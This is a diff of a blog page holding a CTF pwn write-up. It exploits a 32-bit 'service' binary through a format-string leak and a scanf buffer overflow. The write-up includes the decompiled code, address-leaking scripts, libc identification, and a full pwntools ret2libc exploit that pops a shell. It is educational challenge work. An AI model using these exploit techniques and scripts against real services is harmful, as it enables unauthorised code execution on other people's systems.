@@ -6,259 +6,258 @@ Level 1 $ checksec service [*] &amp;#39;/home/vivescere/ctf/bof_2/service&amp;#3
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;</span><div class=post-content><div><p>For this challenge, we were also given a <code>service</code> executable. It was also hosted remotely.</p><p>NOTE: since I&rsquo;m writting this after the CTF ended, the demos are done locally.</p><h2 id=level-1>Level 1<a href=#level-1 class=hanchor arialabel=Anchor>&#8983;</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec service
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_2/service&#39;</span>
-</span></span><span style=display:flex><span>    Arch:     i386-32-little
-</span></span><span style=display:flex><span>    RELRO:    Partial RELRO
-</span></span><span style=display:flex><span>    Stack:    No canary found
-</span></span><span style=display:flex><span>    NX:       NX disabled
-</span></span><span style=display:flex><span>    PIE:      PIE enabled
-</span></span><span style=display:flex><span>    RWX:      Has RWX segments
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$ ./service
-</span></span><span style=display:flex><span>Hello authentifie toi !
-</span></span><span style=display:flex><span>Username: vivescere
-</span></span><span style=display:flex><span>Bienvenue vivescere
-</span></span><span style=display:flex><span>password: mypassword
-</span></span><span style=display:flex><span>oops i have lost my db sorry
-</span></span></code></pre></div><p>This time, the only protection that&rsquo;s activated is PIE, which means addresses won&rsquo;t be stable. We can take a look at the the binary in Ghidra:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>undefined4 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
-</span></span><span style=display:flex><span>  ignorMe(<span style=color:#f92672>&amp;</span>stack0x00000004);
-</span></span><span style=display:flex><span>  vuln();
-</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;oops i have lost my db sorry&#34;</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>vuln</span>(<span style=color:#66d9ef>void</span>) {
-</span></span><span style=display:flex><span>  undefined <span style=color:#f92672>*</span>puVar1;
-</span></span><span style=display:flex><span>  size_t sVar2;
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar3;
-</span></span><span style=display:flex><span>  uint uVar4;
-</span></span><span style=display:flex><span>  undefined4 <span style=color:#f92672>*</span>puVar5;
-</span></span><span style=display:flex><span>  byte bVar6;
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> cStack130;
-</span></span><span style=display:flex><span>  undefined local_81 [<span style=color:#ae81ff>76</span>];
-</span></span><span style=display:flex><span>  undefined4 uStack53;
-</span></span><span style=display:flex><span>  undefined local_31 [<span style=color:#ae81ff>17</span>];
-</span></span><span style=display:flex><span>  undefined4 uStack32;
-</span></span><span style=display:flex><span>  undefined auStack28 [<span style=color:#ae81ff>12</span>];
-</span></span><span style=display:flex><span>  
-</span></span><span style=display:flex><span>  bVar6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Hello authentifie toi !&#34;</span>);
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Username: &#34;</span>);
-</span></span><span style=display:flex><span>  local_31._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>  uStack32 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>  puVar1 <span style=color:#f92672>=</span> (undefined <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>;
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>do</span> {
-</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>(undefined4 <span style=color:#f92672>*</span>)(puVar1 <span style=color:#f92672>+</span> (<span style=color:#66d9ef>int</span>)(local_31 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>    puVar1 <span style=color:#f92672>=</span> puVar1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>;
-</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>while</span> (puVar1 <span style=color:#f92672>&lt;</span> auStack28 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span>(<span style=color:#66d9ef>int</span>)(local_31 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>));
-</span></span><span style=display:flex><span>  local_81._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>  uStack53 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>  uVar4 <span style=color:#f92672>=</span> (uint)(local_31 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span>(<span style=color:#66d9ef>int</span>)(local_81 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>2</span>;
-</span></span><span style=display:flex><span>  puVar5 <span style=color:#f92672>=</span> (undefined4 <span style=color:#f92672>*</span>)(local_81 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> (uVar4 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
-</span></span><span style=display:flex><span>    uVar4 <span style=color:#f92672>=</span> uVar4 <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>puVar5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
-</span></span><span style=display:flex><span>    puVar5 <span style=color:#f92672>=</span> puVar5 <span style=color:#f92672>+</span> (uint)bVar6 <span style=color:#f92672>*</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  fgets(local_81,<span style=color:#ae81ff>0x50</span>,stdin);
-</span></span><span style=display:flex><span>  sVar2 <span style=color:#f92672>=</span> strlen(local_81);
-</span></span><span style=display:flex><span>  (<span style=color:#f92672>&amp;</span>cStack130)[sVar2] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Bienvenue &#34;</span>);
-</span></span><span style=display:flex><span>  printf(local_81);
-</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>password: &#34;</span>);
-</span></span><span style=display:flex><span>  __isoc99_scanf(<span style=color:#f92672>&amp;</span>DAT_00012042,local_31);
-</span></span><span style=display:flex><span>  iVar3 <span style=color:#f92672>=</span> strcmp(local_31,local_81);
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (iVar3 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
-</span></span><span style=display:flex><span>    puts(<span style=color:#e6db74>&#34;WTF ?&#34;</span>);
-</span></span><span style=display:flex><span>  }
-</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>There is an obvious call to <code>printf</code> with <code>local_81</code>, which we can use in a format string exploit, and a call to <code>scanf</code>, which we&rsquo;ll use for our buffer overflow.</p><p>Starting with figuring out the offset:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ cyclic <span style=color:#ae81ff>100</span>  
-</span></span><span style=display:flex><span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
-</span></span><span style=display:flex><span>$ gdb ./service
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>gef➤  r
-</span></span><span style=display:flex><span>Starting program: /home/vivescere/ctf/bof_2/service 
-</span></span><span style=display:flex><span>Hello authentifie toi !
-</span></span><span style=display:flex><span>Username: a
-</span></span><span style=display:flex><span>Bienvenue a
-</span></span><span style=display:flex><span>password: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────────────────── threads ────
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span><span style=color:#75715e>#0] Id 1, Name: &#34;service&#34;, stopped 0x6e616161 in ?? (), reason: SIGSEGV</span>
-</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────────────────────────── trace ────
-</span></span><span style=display:flex><span>───────────────────────────────────────────────────────────────────────────────────────────────────
-</span></span><span style=display:flex><span>gef➤ q
-</span></span><span style=display:flex><span>$ cyclic -l 0x6e616161
-</span></span><span style=display:flex><span><span style=color:#ae81ff>49</span>
-</span></span></code></pre></div><p>Now we need to figure out the version of the libc that was used on the remote server. To do that, we&rsquo;re going to leak a few addresses from the stack.</p><p>Using a simple script (could also have been done in GDB), we can find out which addresses come from the libc (knowing that on my system and for this executable, the libc starts at <code>0xf7cad000</code>).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ERROR&#39;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
-</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1000</span>):
-</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%&#39;</span> <span style=color:#f92672>+</span> str(i)<span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;$p-&#39;</span>)
-</span></span><span style=display:flex><span>    greeting <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
-</span></span><span style=display:flex><span>        leaked_addr <span style=color:#f92672>=</span> int(greeting<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-&#39;</span>)[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(), <span style=color:#ae81ff>16</span>)
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
-</span></span><span style=display:flex><span>        leaked_addr <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> hex(leaked_addr)<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#39;0xf7&#39;</span>):
-</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%&#39;</span> <span style=color:#f92672>+</span> str(i)<span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;$p&#39;</span>, hex(leaked_addr))
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>close()
-</span></span></code></pre></div><p>We can quickly identify the addresses that we get using GDB (<code>info symbol [addr]</code>):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>%2$p 	  0xf7f64540 _IO_2_1_stdin_
-</span></span><span style=display:flex><span>...
-</span></span><span style=display:flex><span>%43$p 	0xf7dc0a0d __libc_start_main
-</span></span></code></pre></div><p>.. now we can do the same on the remote host, and plug the values into the <a href=https://libc.blukat.me>libc database search</a> website. After entering these values:</p><pre tabindex=0><code>__libc_start_main_ret -&gt; b41
+#<a href=https://nicolasb.fr/tags/pwn/>pwn</a>&nbsp;</span><div class=post-content><div><p>For this challenge, we were also given a <code>service</code> executable. It was also hosted remotely.</p><p>NOTE: since I&rsquo;m writting this after the CTF ended, the demos are done locally.</p><h2 id=level-1>Level 1<a href=#level-1 class=hanchor arialabel=Anchor>&#8983;</a></h2><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ checksec service
+<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/vivescere/ctf/bof_2/service&#39;</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+
+$ ./service
+Hello authentifie toi !
+Username: vivescere
+Bienvenue vivescere
+password: mypassword
+oops i have lost my db sorry
+</code></pre></div><p>This time, the only protection that&rsquo;s activated is PIE, which means addresses won&rsquo;t be stable. We can take a look at the the binary in Ghidra:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>undefined4 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
+  ignorMe(<span style=color:#f92672>&amp;</span>stack0x00000004);
+  vuln();
+  puts(<span style=color:#e6db74>&#34;oops i have lost my db sorry&#34;</span>);
+  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+}
+
+<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>vuln</span>(<span style=color:#66d9ef>void</span>) {
+  undefined <span style=color:#f92672>*</span>puVar1;
+  size_t sVar2;
+  <span style=color:#66d9ef>int</span> iVar3;
+  uint uVar4;
+  undefined4 <span style=color:#f92672>*</span>puVar5;
+  byte bVar6;
+  <span style=color:#66d9ef>char</span> cStack130;
+  undefined local_81 [<span style=color:#ae81ff>76</span>];
+  undefined4 uStack53;
+  undefined local_31 [<span style=color:#ae81ff>17</span>];
+  undefined4 uStack32;
+  undefined auStack28 [<span style=color:#ae81ff>12</span>];
+  
+  bVar6 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+  puts(<span style=color:#e6db74>&#34;Hello authentifie toi !&#34;</span>);
+  printf(<span style=color:#e6db74>&#34;Username: &#34;</span>);
+  local_31._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+  uStack32 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+  puVar1 <span style=color:#f92672>=</span> (undefined <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>;
+  <span style=color:#66d9ef>do</span> {
+    <span style=color:#f92672>*</span>(undefined4 <span style=color:#f92672>*</span>)(puVar1 <span style=color:#f92672>+</span> (<span style=color:#66d9ef>int</span>)(local_31 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    puVar1 <span style=color:#f92672>=</span> puVar1 <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>;
+  } <span style=color:#66d9ef>while</span> (puVar1 <span style=color:#f92672>&lt;</span> auStack28 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span>(<span style=color:#66d9ef>int</span>)(local_31 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>));
+  local_81._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+  uStack53 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+  uVar4 <span style=color:#f92672>=</span> (uint)(local_31 <span style=color:#f92672>+</span> <span style=color:#f92672>-</span>(<span style=color:#66d9ef>int</span>)(local_81 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>2</span>;
+  puVar5 <span style=color:#f92672>=</span> (undefined4 <span style=color:#f92672>*</span>)(local_81 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>);
+  <span style=color:#66d9ef>while</span> (uVar4 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
+    uVar4 <span style=color:#f92672>=</span> uVar4 <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>;
+    <span style=color:#f92672>*</span>puVar5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    puVar5 <span style=color:#f92672>=</span> puVar5 <span style=color:#f92672>+</span> (uint)bVar6 <span style=color:#f92672>*</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
+  }
+  fgets(local_81,<span style=color:#ae81ff>0x50</span>,stdin);
+  sVar2 <span style=color:#f92672>=</span> strlen(local_81);
+  (<span style=color:#f92672>&amp;</span>cStack130)[sVar2] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;\0&#39;</span>;
+  printf(<span style=color:#e6db74>&#34;Bienvenue &#34;</span>);
+  printf(local_81);
+  printf(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>password: &#34;</span>);
+  __isoc99_scanf(<span style=color:#f92672>&amp;</span>DAT_00012042,local_31);
+  iVar3 <span style=color:#f92672>=</span> strcmp(local_31,local_81);
+  <span style=color:#66d9ef>if</span> (iVar3 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
+    puts(<span style=color:#e6db74>&#34;WTF ?&#34;</span>);
+  }
+  <span style=color:#66d9ef>return</span>;
+}
+</code></pre></div><p>There is an obvious call to <code>printf</code> with <code>local_81</code>, which we can use in a format string exploit, and a call to <code>scanf</code>, which we&rsquo;ll use for our buffer overflow.</p><p>Starting with figuring out the offset:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cyclic <span style=color:#ae81ff>100</span>  
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+$ gdb ./service
+...
+gef➤  r
+Starting program: /home/vivescere/ctf/bof_2/service 
+Hello authentifie toi !
+Username: a
+Bienvenue a
+password: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+...
+────────────────────────────────────────────────────────────────────────────────────── threads ────
+<span style=color:#f92672>[</span><span style=color:#75715e>#0] Id 1, Name: &#34;service&#34;, stopped 0x6e616161 in ?? (), reason: SIGSEGV</span>
+──────────────────────────────────────────────────────────────────────────────────────── trace ────
+───────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤ q
+$ cyclic -l 0x6e616161
+<span style=color:#ae81ff>49</span>
+</code></pre></div><p>Now we need to figure out the version of the libc that was used on the remote server. To do that, we&rsquo;re going to leak a few addresses from the stack.</p><p>Using a simple script (could also have been done in GDB), we can find out which addresses come from the libc (knowing that on my system and for this executable, the libc starts at <code>0xf7cad000</code>).</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/env python3</span>
+<span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+
+context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ERROR&#39;</span>
+
+exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>, checksec<span style=color:#f92672>=</span>False)
+
+context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
+context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]
+
+<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>1000</span>):
+    r <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
+    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%&#39;</span> <span style=color:#f92672>+</span> str(i)<span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;$p-&#39;</span>)
+    greeting <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
+    <span style=color:#66d9ef>try</span>:
+        leaked_addr <span style=color:#f92672>=</span> int(greeting<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-&#39;</span>)[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(), <span style=color:#ae81ff>16</span>)
+    <span style=color:#66d9ef>except</span>:
+        leaked_addr <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>
+    <span style=color:#66d9ef>if</span> hex(leaked_addr)<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#39;0xf7&#39;</span>):
+        <span style=color:#66d9ef>print</span>(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%&#39;</span> <span style=color:#f92672>+</span> str(i)<span style=color:#f92672>.</span>encode() <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;$p&#39;</span>, hex(leaked_addr))
+    r<span style=color:#f92672>.</span>close()
+</code></pre></div><p>We can quickly identify the addresses that we get using GDB (<code>info symbol [addr]</code>):</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>%2$p 	  0xf7f64540 _IO_2_1_stdin_
+...
+%43$p 	0xf7dc0a0d __libc_start_main
+</code></pre></div><p>.. now we can do the same on the remote host, and plug the values into the <a href=https://libc.blukat.me>libc database search</a> website. After entering these values:</p><pre><code>__libc_start_main_ret -&gt; b41
 _IO_2_1_stdin_        -&gt; 5c0
-</code></pre><p>We get four possible versions. I tested them all until one worked (using the exploit below). The correct version (or at least a compatible one) was <code>libc6-i386_2.28-10_amd64</code>.</p><p>Now that we know all of this, the exploit needs to 1. leak an address so that we can defeat ASLR and 2. build a simple ropchain to pop a shell.</p><p>Here is the exploit script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
-</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./service&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
-</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>terminal <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;konsole&#39;</span>, <span style=color:#e6db74>&#39;-e&#39;</span>]
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
-</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
-</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;XXX.XXX.XXX.XXX&#34;</span>, <span style=color:#ae81ff>00000</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e># libc6-i386_2.28-10_amd64</span>
-</span></span><span style=display:flex><span>libc_config <span style=color:#f92672>=</span> {
-</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;io_2_1_stdin&#39;</span>: <span style=color:#ae81ff>0x001da5c0</span>,
-</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;system&#39;</span>: <span style=color:#ae81ff>0x0003e9e0</span>,
-</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;str_bin_sh&#39;</span>: <span style=color:#ae81ff>0x17eaaa</span>,
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
-</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> conn()
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;%2$p-&#39;</span>)
-</span></span><span style=display:flex><span>    greeting <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;: &#39;</span>)
-</span></span><span style=display:flex><span>    leaked_io_2_1_stdin <span style=color:#f92672>=</span> int(greeting<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;-&#39;</span>)[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>decode(), <span style=color:#ae81ff>16</span>)
-</span></span><span style=display:flex><span>    libc_address <span style=color:#f92672>=</span> leaked_io_2_1_stdin <span style=color:#f92672>-</span> libc_config[<span style=color:#e6db74>&#39;io_2_1_stdin&#39;</span>]
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    sys <span style=color:#f92672>=</span> p32(libc_address <span style=color:#f92672>+</span> libc_config[<span style=color:#e6db74>&#39;system&#39;</span>])
-</span></span><span style=display:flex><span>    sh <span style=color:#f92672>=</span> p32(libc_address <span style=color:#f92672>+</span> libc_config[<span style=color:#e6db74>&#39;str_bin_sh&#39;</span>])
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>sendline(flat({<span style=color:#ae81ff>49</span>: sys <span style=color:#f92672>+</span> p32(<span style=color:#ae81ff>0xcafebabe</span>) <span style=color:#f92672>+</span> sh}))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    r<span style=color:#f92672>.</span>interactive()
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
-</span></span><span style=display:flex><span>    main()
